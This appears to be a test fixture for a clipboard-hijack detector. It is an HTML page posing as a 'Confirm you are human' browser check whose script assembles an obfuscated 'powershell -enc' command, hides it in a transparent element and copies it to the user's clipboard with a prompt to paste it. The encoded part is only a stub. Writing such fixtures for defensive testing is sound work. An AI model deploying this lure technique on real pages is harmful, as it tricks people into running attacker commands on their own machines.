<!doctype html><meta charset="utf-8"><title>Checking your browser</title>
<h1>Confirm you are human</h1>
<button id="c">Continue</button>
<pre id="decoy" style="opacity:0;position:absolute;left:10px;top:400px;width:300px;height:40px"></pre>
<div id="steps"></div>
<script>
  // Forgery attempt: the written payload equals a transparent <pre> (and is selected), so a naive
  // "matches a code block" check would call it the user's own copy. Only weak lure words here, so the
  // block depends on the match being rejected. Payload built at runtime.
  var payload = ['power', 'shell', ' -en', 'c', ' SQBFAFgA'].join('');
  document.getElementById('decoy').textContent = payload;
  document.getElementById('c').onclick = function () {
    var r = document.createRange(); r.selectNodeContents(document.getElementById('decoy'));
    var s = getSelection(); s.removeAllRanges(); s.addRange(r);
    try { navigator.clipboard.writeText(payload); } catch (e) {}
    document.getElementById('steps').textContent = 'Paste it to continue.';
  };
</script>
